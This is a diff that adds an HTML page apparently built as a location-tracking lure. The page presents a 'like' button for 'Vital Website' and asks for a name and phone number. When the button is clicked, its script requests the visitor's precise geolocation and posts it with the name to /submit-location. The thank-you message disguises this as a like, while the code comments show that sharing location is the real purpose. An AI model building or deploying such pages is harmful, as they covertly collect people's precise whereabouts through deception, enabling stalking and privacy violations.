@@ -1,0 +1,93 @@
+<!doctype html>
+<html>
+<head>
+  <title>Visit Vital's Website</title>
+  <link rel="stylesheet" href="style.css" class="style">
+  <link rel="icon" href="favicon_io/favicon.ico"type="image/x-icon" class="favicon">
+  <style>
+    body{
+      background-color: black;
+      color: aliceblue;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 50px;
+    }
+    .login{
+      background-color: darkslateblue;
+      float: left;
+      font-size: large;
+      width: 400px;
+      height: 400px;
+      margin-left: 50px;
+    }
+    .background{
+      float: right;
+      margin-right: 80px;
+      margin-top: -60px;
+    }
+    .support{
+      font-size: 30px;
+      font-family: Verdana, Geneva, Tahoma, sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="head">
+    <!--Click to share your location-->
+    <h2>Click to like Vital Website</h2>
+  </div>
+
+  <!-- Name input -->
+  <div class="login">
+    <label type="text">Enter Your user name</label><br>
+    <input type="text" id="username" placeholder=" your name" /><br><br>
+    <label type="text">Enter phone number</label><br>
+    <input type="text" id="phone" placeholder="Phone number"></input><br><br>
+    <!--Share my location-->
+    <button id="shareBtn">I LIKE THIS❤💚</button>
+    <div class="support">
+      <p>Thank you for your support🙏🙏🙏🙏</p>
+    </div>
+  </div><br>
+
+
+  <script>
+    document.getElementById('shareBtn').onclick = async () => {
+      if (!navigator.geolocation) {
+        alert('Geolocation not supported');
+        return;
+      }
+
+      const nameInput = document.getElementById('username');
+      const name = nameInput.value.trim() || "Anonymous";
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const data = {
+          name: name,
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: pos.timestamp
+        };
+
+        const response = await fetch('/submit-location', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          alert(`Thank you for liking Vital Web, ${name}!`);
+          nameInput.value = ""; // Clear input after success
+        } else {
+          alert('Failed to send like.');
+        }
+      }, (err) => {
+        alert('Error: ' + err.message);
+      });
+    };
+  </script>
+  <div class="background">
+    <img src="Protais.jpg" alt="Protais" class="protais" width="500px" height="500px">
+  </div>
+</body>
+</html>
